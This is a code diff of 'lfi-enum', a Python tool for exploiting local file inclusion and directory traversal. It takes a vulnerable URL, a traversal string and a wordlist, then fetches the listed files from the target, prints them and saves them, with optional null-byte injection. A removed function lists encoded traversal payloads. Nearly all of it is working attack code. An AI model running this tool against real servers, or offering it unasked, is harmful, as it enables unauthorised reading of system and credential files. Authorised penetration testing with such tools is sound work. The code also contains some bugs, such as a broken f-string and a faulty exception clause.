@@ -4,59 +4,51 @@
 # LFI Payloads: https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad/LFI
 # TODO: Automatically detect if a null byte needs to be added
 
+
 import requests,sys,argparse,os,time
 from urllib.parse import quote
 from pathlib import Path
 
-version="0.1"
+version="0.2"
+
+debug=False
+verbose=False
+dprint=None
+vprint=None
+
 
 def printBanner():
-	print("lfi-enum {}".format(version))
-
-
-def printTraversalHints():
-	"Gives the user some ideas for directory traversal"
-	print("You can try the following encoded directory traversal encoding schemes:\n")
-	print("\t../")
-	print("\t..\\")
-	print("\t..\\/")
-	print("\t%2e%2e%2f")
-	print("\t%252e%252e%252f")
-	print("\t%c0%ae%c0%ae%c0%af")
-	print("\t%uff0e%uff0e%u2215")
-	print("\t%uff0e%uff0e%u2216")
-	print("\t..././")
-	print("\t....\\")
-	print("\t/???/")
+	print(f"lfi-enum {version}")
 
 
 def loadWordlist(wordlistfile):
-	vprint("Loading wordlist from {}...".format(wordlistfile))
+	print(f"Loading wordlist from {wordlistfile}...")
 	wordlist=[]
 	try:
 		with open(wordlistfile,"r") as file:
 			for line in file:
-				wordlist.append(line)
+				if line.strip():		# skip blank lines, and remove whitespace
+					wordlist.append(line.strip())
 
 	except Exception as e:
-		print("Cannot open specified wordlist file: {}".format(wordlistfile))
+		print(f"Cannot open specified wordlist file: {wordlistfile}")
 		print(str(e))
 		exit()
 	
-	print('Loaded %d paths to check.' % (len(wordlist)))
-	dprint("DEBUG: Loaded wordlist: {}".format(wordlist))
+	print(f"Loaded {len(wordlist)} paths to check.")
+	dprint(f"DEBUG: Loaded wordlist: {wordlist}")
 	return wordlist
 
 
 
 def createDir(directory):
 	newdir=Path(os.getcwd(),directory)  
-	vprint("Creating {}".format(newdir))
+	print(f"Creating {newdir}")
 
 	try:
 		os.makedirs(newdir,0o775,True)
 	except FileExistsError:
-		print("{} already exists.".format(newdir))
+		print("{newdir} already exists.")
 		pass
 	except OSError as e:
 		raise e
@@ -84,13 +76,13 @@ def writeFile(filename,content,directory):
 
 	# Build the full file path
 	d=Path(directory)
-	f=d/tmpfile
+	f=d/tmpfile        # ok this is pathlib syntactic sugar that combines two path objects
 
 	# Then open the file and write it.
 	f=str(f).rstrip()
 
 	if len(content)>0:
-		print("Writing file {}".format(f))
+		print(f"Writing file {f}")
 		try:
 			fh = open(f,"w")
 			fh.write(content)
@@ -99,68 +91,190 @@ def writeFile(filename,content,directory):
 			raise
 
 
-def testLFI(path,wordlist,directory=None,null=False):
-	"The meat of the program. iterate through word list and request each file. Write files out if requested"
-	print("------------------------------------------------------------------------")
+def splitWordList(wordlist):
+	relative=[]
+	absolute=[]
+
 	for line in wordlist:
-		# remove any unexpected EOL whitespace 
-		line=line.rstrip()
+
+		if line[0] =="/":
+			absolute.append(line)
+		else:
+			relative.append(line)
 
 
-		url=path+line
+	dprint(f"DEBUG: relative length: {len(relative)}")
+	dprint(f"DEBUG: absolute length: {len(absolute)}")
+
+	#dprint(f"DEBUG: Absolute list: {absolute}")
+	#dprint(f"DEBUG: Relative list: {relative}")
+
+	return(relative,absolute)
+
+
+def testLFI(url,traversalString,wordlist,directory=None,null=False,headers=None):
+# The meat of the program. iterate through word list and request each file. Write files out if requested
+	print("------------------------------------------------------------------------")
+
+
+	sess=requests.Session()
+	sess.headers.update(headers)
+
+	relative,absolute=splitWordList(wordlist)
+
+	#exit()
+
+	# First lets check current directory for relative paths
+
+	for line in wordlist:
+		# Absolute paths need traversal string to get to root
+		# Relative paths (without a / prefix on the line) can go from cwd
+
+		# Ignore comments
+		if line[0] =="#":
+			continue
+		if line[0]=="/":
+			testUrl=url+traversalString+line
+		else:
+			testUrl=url+line
 
 		# If user flags for null byte. 
 		if null:
 			vprint("Appending null byte")
-			url+="\x00"
+			testUrl+="\x00"
 
-		vprint("Requesting {}".format(url))
+		vprint(f"Requesting {testUrl}")
 		
 		try:
-			r=requests.get(url,allow_redirects=False)
-		except Error as e:
-			raise
-
-		dprint("DEBUG: Response: {}, Status: {}, Length {}".format(url,str(r.status_code),str(r.headers["Content-Length"])),end='\n')
-		dprint("DEBUG: Response Headers: {}".format(r.headers))
+			r=sess.get(testUrl,allow_redirects=True)
+		except Exception as e:
+			raise e
+		#dprint(f"DEBUG: Response: {url}, Status: {r.status_code}, Length {r.headers['content-length']}")
+		dprint(f"DEBUG: Response Headers: {r.headers}")
 
 		# Detect, alert and exit on HTTP redirection
 		if r.status_code>300 and r.status_code <=399:
-			print("WARNING: Redirected to {}".format(r.headers["location"]))
-			print("Aborting...")
+			print(f"WARNING: Redirected to {r.headers["location"]}")
+			print("Run again and enable following redirection")
 			exit()
 
 		if r.status_code==200:
 			if int(r.headers["Content-Length"])==0:
-				vprint("{}: No content".format(line))
-				vprint("------------------------------------------------------------------------")
+				print(f"{line}: No content")
+				print("------------------------------------------------------------------------")
 			else:
-				print("Success: {}\t".format(url))
-				vprint(r.text)
+				print(f"Success: \t{testUrl}")
+				print(r.text)
 				# If we were passed a directory, write the response body in there.
 				if directory!=None:
 					writeFile(line,r.text,directory)
 				print("------------------------------------------------------------------------")
 		else:
-			print("{} Error requesting {}.".format(str(r.status_code),url))
-			#print(str(r.status_code)+ " Error requesting "+url)
+			vprint(f"{r.status_code} Error requesting {testUrl}")
 
 
-def main(args):
+
+
+def parseArgs(argv):
+	parser = argparse.ArgumentParser( 
+	                                description = "Automates directory traversal and LFI checks. Wordlists consist of filenames prefixed with './' to check relative to cwd, or absolute paths",
+	                                )
+
+	parser.add_argument(
+	                      "url",
+	                      help = "Base URL to directory traversal vulnerability.  e.g http://hostname/path?arg="
+	                      )
+
+
+	parser.add_argument(
+						  "-t",
+						  "--traversalString",
+						  help="The string required to reach the root directory, e.g. ../../../..",
+						  action="store",
+						  required=True
+						  )
+	parser.add_argument(
+						  "-w",
+	                      "--wordlist",
+	                      action="store",
+	                      help="Specify an LFI wordlist. Wordlists are expected to be absolute paths on target system, or relative to the cwd",
+						  required=True
+						  )
+
+	parser.add_argument(
+	                      "-H",
+	                      "--header",
+	                      help="add a custom header",
+	                      type=str,
+	                      action="store"
+	                      )
+
+
+	parser.add_argument(
+	                      "-v",
+	                      "--verbose",
+	                      help="increase output verbosity",
+	                      action="store_true"
+	                      )
+	parser.add_argument(
+	                      "-d",
+	                      "--debug",
+	                      help="debug output",
+	                      action="store_true"
+	                      )
+
+	parser.add_argument(
+						  "-o",
+						  "--outdir",
+						  help="Specify a directory relative to the current directory to save files. Filenames will be flattened in here"
+						  )
+	parser.add_argument(
+						  "-n",
+						  "--nullbyte",
+						  help="Appends a null byte (0x00) to each request. This may allow requests to web apps that automatically append a file extension.",
+						  action="store_true"
+						  )
+
+#	parser.add_argument(
+#						  "-r",
+#						  "--remote",
+#						  help="TODO: Not Implimented. Starts a simple webserver and attempts a remote file inclusion ")
+
+
+	return parser.parse_args()
+
+
+
+def main():
+
+	args=parseArgs(sys.argv)
+	
+	global debug
+	global verbose
+	debug = args.debug
+	verbose=args.verbose
+
+	# Define a verbose printing mechanism
+	global vprint
+	vprint = print if args.verbose else lambda *a, **k: None
+
+	#define a seperate debug print
+	global dprint
+	dprint = print if args.debug else lambda *a, **k: None
+
 	printBanner()
 
-	# Give user hints and exit.	
-	if(args.traversal):
-		printTraversalHints()
-		exit()
+
+
+
 
 	# Build out the base URL from commandline arguments to test against
 	
-	base_url=args.url
-	path_traversal_escape=args.traversal_string
+	url=args.url
+	traversalString=args.traversalString
 	outdir=args.outdir
 
-	path=base_url+path_traversal_escape
+#	path=url+traversalString
 
 
 	# Load wordlist from file.
@@ -169,99 +283,31 @@ def main(args):
 
 	# Create Output Directory if required
 	if outdir!=None:
-		print("Output directory: {}".format(outdir))
+		print(f"Output directory: {outdir}")
 		fulldir=createDir(outdir)
 	else:
 		fulldir=None
 
 #	exit()		# Exit for now
-	testLFI(path,wordlist,fulldir,args.nullbyte)
+
+	# make headers
+	headerlist=args.header.split(":",maxsplit=1)
+	headers={headerlist[0].lstrip():headerlist[1].lstrip()}
+	print(headers)
+
+	testLFI(url,traversalString,wordlist,fulldir,args.nullbyte,headers)
+
 
 
 
 
 
 if __name__== '__main__':
-	parser = argparse.ArgumentParser( 
-	                                description = "Automates directory traversal and LFI checks.",
-	                                epilog = "As an alternative to the commandline, params can be placed in a file, one per line, and specified on the commandline like '%(prog)s @params.conf'.",
-	                                fromfile_prefix_chars = '@' )
-
-	parser.add_argument(
-	                      "url",
-	                      help = "Base URL to directory traversal vulnerability.  e.g http://hostname/path?arg=")
-
-
-	parser.add_argument(
-						  "traversal_string",
-						  help="The string required to reach the root directory, e.g. ../../../..")
-	parser.add_argument(
-	                      "wordlist",
-	                      help="Specify an LFI wordlist. Wordlists are expected to be absolute paths on target system")
-
-#	parser.add_argument(
-#	                      "-u",
-#	                      "--url",
-#	                      help = "Base URL to directory traversal vulnerability.  e.g http://hostname/path?arg=",
-#	                      metavar = "URL")
-
-#	parser.add_argument(
-#						  "-p",
-#						  "--traversal_string",
-#						  default="../../../..",
-#						  help="The string required to reach the root directory. Default to  ../../../..")
-
-#	parser.add_argument(
-#	                      "-w",
-#	                      "--wordlist",
-#	                      help="Specify an LFI wordlist. Wordlists are expected to be absolute paths on target system")
-
-
-	parser.add_argument(
-	                      "-v",
-	                      "--verbose",
-	                      help="increase output verbosity",
-	                      action="store_true")
-	parser.add_argument(
-	                      "-d",
-	                      "--debug",
-	                      help="debug output",
-	                      action="store_true")
-
-	parser.add_argument(
-						  "-o",
-						  "--outdir",
-						  help="Specify a directory relative to the current directory to save files. Filenames will be flattened in here")
-	parser.add_argument(
-						  "-t",
-						  "--traversal",
-						  help="Prints some example directory traversal strings to try.",
-						  action="store_true")
-	parser.add_argument(
-						  "-n",
-						  "--nullbyte",
-						  help="Appends a null byte (0x00) to each request. This may allow requests to web apps that automatically append a file extension.",
-						  action="store_true")
-
-#	parser.add_argument(
-#						  "-r",
-#						  "--remote",
-#						  help="TODO: Not Implimented. Starts a simple webserver and attempts a remote file inclusion ")
-
-
-	if len(sys.argv)==1:
-		parser.print_help()
-		sys.exit()
-
-	args = parser.parse_args()
-
-	# Define a verbose printing mechanism
-	vprint = print if args.verbose else lambda *a, **k: None
-
-	#define a seperate debug print
-	dprint = print if args.debug else lambda *a, **k: None
-
-main(args)
+	try:
+		main()
+	except KeyboardInterrupt or OSError:
+			print("ctrl-c detected. quitting")
+			exit(1)
 
 
 
